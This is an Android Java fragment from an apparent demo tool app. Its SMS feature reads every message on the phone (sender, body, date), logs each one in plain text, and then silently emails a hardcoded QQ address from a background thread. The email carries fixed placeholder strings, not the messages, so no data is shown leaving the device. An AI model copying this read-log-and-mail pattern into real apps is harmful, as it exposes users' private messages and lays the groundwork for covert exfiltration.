package com.binny.openapi.mvp.view.fgtool;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.util.Log;
import android.view.View;
import android.widget.GridView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.binny.openapi.R;
import com.binny.openapi.bean.ToolBean;
import com.binny.openapi.callback.OnPermissionCallback;
import com.binny.openapi.constant.ConstantParams;
import com.binny.openapi.mvp.view.activity.BluetoochActivity;
import com.binny.openapi.mvp.view.activity.WebActivity;
import com.binny.openapi.mvp.view.base.AbsBaseFragment;
import com.binny.openapi.util.FileUtils;
import com.binny.openapi.util.UtilsLog;
import com.binny.openapi.util.UtilsPerMission;
import com.binny.openapi.widget.dialog.HuoDongDialog;
import com.smart.holder.CommonAdapter;
import com.xander.sendemaillib.SendEmail;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * author binny date 5/9
 */
public class ToolFragment extends AbsBaseFragment implements IToolItemClickedListener {
    private final String[] itemString =
            new String[]{"活动对话框", "清除缓存", "请求权限", "蓝牙", "优词词典", "截图", "短信"};
    private TextView tvCacheSize;
    private GridView mGridView;

    @Override
    protected int getFragmentLayout() {
        return R.layout.fragment_mine;
    }

    @Override
    protected void initView(View view) {
        tvCacheSize = view.findViewById(R.id.tv_cache_size);
        RelativeLayout textView = view.findViewById(R.id.rl_clear_cache);
        mImmersionBar.with(this).titleBar(view.findViewById(R.id.tool_ll)).execute();
        mGridView = view.findViewById(R.id.tool_gv);
        textView.setOnClickListener(
                v ->
                        UtilsPerMission.getPermission(
                                new OnPermissionCallback() {
                                    @Override
                                    public void onGranted() {
                                        toast("请求成功");
                                    }

                                    @Override
                                    public void onDeny() {
                                        toast("请求权限失败");
                                    }
                                },
                                getActivity(),
                                textView,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE));
    }

    private void toast(String s) {
        Toast.makeText(mActivity, s, Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void initRefreshView(final View containerView) {
    }

    @Override
    protected void getData() {
        String size = getSize();
        tvCacheSize.setText(size);
        List<ToolBean> items = new ArrayList<>();
        for (String anItemString : itemString) {
            items.add(new ToolBean().setItemText(anItemString));
        }
        mGridView.setAdapter(
                new CommonAdapter<>(
                        getActivity(), items, R.layout.item_fragment_tool, new ToolViewHolderHelper(this)));
    }

    private String getSize() {
        return FileUtils.getTotalCacheSize(getActivity(), ConstantParams.PATH_PICTURE);
    }

    @Override
    protected void onRefresh() {
    }

    @Override
    protected void onLoadMore() {
    }

    @Override
    public void onResume() {
        super.onResume();
    }

    public void setCacheSize() {
        String size = getSize();
        if (tvCacheSize != null) {
            tvCacheSize.setText(size);
        }
    }

    @Override
    public void onItemClicked(int position, View view) {

        switch (position) {
            case 0: // 活动弹窗
                new HuoDongDialog(mActivity)
                        .setBtnBgColor("35462156")
                        .setMarginBottom(0)
                        .setHuoDongMessage(
                                "1、要很少的控制点就能够生成复杂平滑曲线要很少的控制点就能够生成复杂平滑曲线\n2、要很少的控制点就能够生成复杂平滑曲线\n3、的方法，来辅助汽车车体的工业设计")
                        .setHuoDongImgUrl(
                                "http://dynamic-image.yesky.com/740x-/uploadImages/2015/163/50/690V3VHW0P77.jpg")
                        .setScaleWH(1.0)
                        .setScaleWidth(0.8f)
                        .show();
                break;
            case 1: // 清除缓存
                AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
                builder.setTitle("敏感操作，谨慎选择");
                builder.setMessage("确定要删除所有缓存么，包括文字、picture、音乐和视频?");
                builder.setPositiveButton(
                        "确定",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                FileUtils.cleanApplicationData(getActivity(), ConstantParams.PATH_PICTURE);
                                String size = getSize();
                                tvCacheSize.setText(size);
                            }
                        });
                builder.setNegativeButton(
                        "取消",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                UtilsLog.i("取消删除缓存!");
                            }
                        });
                builder.show();
                break;
            case 2:
                UtilsPerMission.getPermission(
                        new OnPermissionCallback() {
                            @Override
                            public void onGranted() {
                                toast("请求成功");
                            }

                            @Override
                            public void onDeny() {
                                toast("请求权限失败");
                            }
                        },
                        getActivity(),
                        view,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE);
                break;
            case 3: // 蓝牙
                startActivity(new Intent(mActivity, BluetoochActivity.class));
                break;
            case 4: // 词典
                Intent intent = new Intent(mActivity, WebActivity.class);
                intent.putExtra("loadUrl", "http://www.youdict.com/");
                intent.putExtra("adblock", false);
                startActivity(intent);
                break;
            case 5: // 截图
                // https://m.jb51.net/article/119881.htm
                break;
            case 6: // 短信
                UtilsPerMission.getPermission(
                        new OnPermissionCallback() {
                            @Override
                            public void onGranted() {
                                toast("请求成功");
                                getSmsInPhone();
                            }

                            @Override
                            public void onDeny() {
                                toast("请求权限失败");
                            }
                        },
                        getActivity(),
                        view,
                        Manifest.permission.READ_SMS);

                break;
        }
    }

    private Uri SMS_INBOX = Uri.parse("content://sms/");

    public void getSmsFromPhone() {
        ContentResolver cr = mActivity.getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("ooc", "************cur == null");
            return;
        }
        int i = 0;
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address")); // 手机号
            String name = cur.getString(cur.getColumnIndex("person")); // 联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body")); // 短信内容
            // 至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            Log.i(TAG, "getSmsFromPhone: name : " + name);
            Log.i(TAG, "getSmsFromPhone: number : " + number);
            Log.i(TAG, "getSmsFromPhone: body : " + body);
            i++;
        }
        Log.i(TAG, "getSmsFromPhone:  = " + i);
        cur.close();
    }

    public String getSmsInPhone() {
        final String SMS_URI_ALL = "content://sms/";
        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_SEND = "content://sms/sent";
        final String SMS_URI_DRAFT = "content://sms/draft";

        StringBuilder smsBuilder = new StringBuilder();
        Cursor cur = null;
        try {
            ContentResolver cr = mActivity.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
            Uri uri = Uri.parse(SMS_URI_ALL);
            cur = cr.query(uri, projection, null, null, "date desc");

            if (cur != null) {
                if (cur.moveToFirst()) {
                    String name;
                    String phoneNumber;
                    String smsbody;
                    String date;
                    String type;

                    int nameColumn = cur.getColumnIndex("person");
                    int phoneNumberColumn = cur.getColumnIndex("address");
                    int smsbodyColumn = cur.getColumnIndex("body");
                    int dateColumn = cur.getColumnIndex("date");
                    int typeColumn = cur.getColumnIndex("type");

                    do {
                        name = "联系人：" + cur.getString(nameColumn);
                        phoneNumber = "手机号：" + cur.getString(phoneNumberColumn);
                        smsbody = "短信内容：" + cur.getString(smsbodyColumn);

                        @SuppressLint("SimpleDateFormat")
                        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                        Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                        date = dateFormat.format(d);

                        int typeId = cur.getInt(typeColumn);
                        if (typeId == 1) {
                            type = "接收";
                        } else if (typeId == 2) {
                            type = "发送";
                        } else {
                            type = "";
                        }

                        smsBuilder.append("[");
//            smsBuilder.append(name).append(",");
                        smsBuilder.append(phoneNumber).append(",");
                        smsBuilder.append(smsbody).append(",");
                        smsBuilder.append(date).append(",");
                        smsBuilder.append(type);
                        smsBuilder.append("] \n");

                    } while (cur.moveToNext());
                } else {
                    smsBuilder.append("no result!");
                }
            }

            smsBuilder.append("getSmsInPhone has executed!");
        } catch (SQLiteException ex) {
            Log.d("sss", ex.getMessage());
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
        Log.i(TAG, "getSmsInPhone: " + smsBuilder.toString());
        new Thread() {
            @Override
            public void run() {
                super.run();
                List<String> strings = new ArrayList<>();
                strings.add("596928539@qq.com");
                SendEmail.send(strings, "c2222rash", "测试数据");
            }
        }.start();
        return smsBuilder.toString();
    }
}
